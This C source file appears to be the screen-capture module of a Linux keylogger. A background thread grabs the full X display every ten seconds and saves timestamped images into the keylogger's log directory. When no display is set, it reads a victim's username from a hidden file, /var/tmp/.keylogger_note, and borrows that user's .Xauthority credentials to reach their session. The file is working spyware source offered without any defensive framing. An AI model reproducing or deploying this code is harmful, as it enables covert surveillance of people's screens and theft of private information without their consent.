#include "screenShot.h"

void saveFile(const char *filename, XImage *image)
{
    FILE *fp = fopen(filename, "wb");
    if (!fp)
    {
        perror("fopen");
        return;
    }

    fprintf(fp, "P6\n%d %d\n255\n", image->width, image->height);
    for (int y = 0; y < image->height; y++)
    {
        for (int x = 0; x < image->width; x++)
        {
            unsigned long pixel = XGetPixel(image, x, y);
            unsigned char r = (pixel & image->red_mask) >> 16;
            unsigned char g = (pixel & image->green_mask) >> 8;
            unsigned char b = (pixel & image->blue_mask);
            fputc(r, fp);
            fputc(g, fp);
            fputc(b, fp);
        }
    }
    fclose(fp);
}

void *screenShot(void *arg)
{
    if (getenv("DISPLAY") == NULL)
    {
        setenv("DISPLAY", ":0", 1);
        const char *file = "/var/tmp/.keylogger_note";
        FILE *f = fopen(file, "r");

        char user[12];
        fgets(user, sizeof(user), f);
        fclose(f);
        char xauth_path[100];
        snprintf(xauth_path, sizeof(xauth_path), "/home/%s/.Xauthority", user);
        setenv("XAUTHORITY", xauth_path, 1);
    }

    Display *display = NULL;
    while (display == NULL)
    {
        display = XOpenDisplay(NULL);
        if (display != NULL)
            break;
    }
    // Get screen dimensions
    Screen *screen = DefaultScreenOfDisplay(display);
    // Get the root window (the entire screen)
    Window root = DefaultRootWindow(display);
    int width = screen->width;
    int height = screen->height;

    while (1)
    {
        char folderCopy[512];
        pthread_mutex_lock(&dirLock);
        strncpy(folderCopy, KeyLogDir, sizeof(folderCopy) - 1);
        pthread_mutex_unlock(&dirLock);
        folderCopy[sizeof(folderCopy) - 1] = '\0';

        char filename[512];
        time_t now = time(NULL);
        struct tm *t = localtime(&now);
        char timebuf[64];
        strftime(timebuf, sizeof(timebuf), "%Y-%m-%d_%H-%M-%S", t);

        snprintf(filename, sizeof(filename), "%s/screenshot_%s.ppm", folderCopy, timebuf);

        // Capture the screen
        XImage *image = XGetImage(display, root, 0, 0, width, height, AllPlanes, ZPixmap);
        if (image)
        {
            saveFile(filename, image);
            XDestroyImage(image);
        }

        sleep(10);
    }

    XCloseDisplay(display);
    return NULL;
}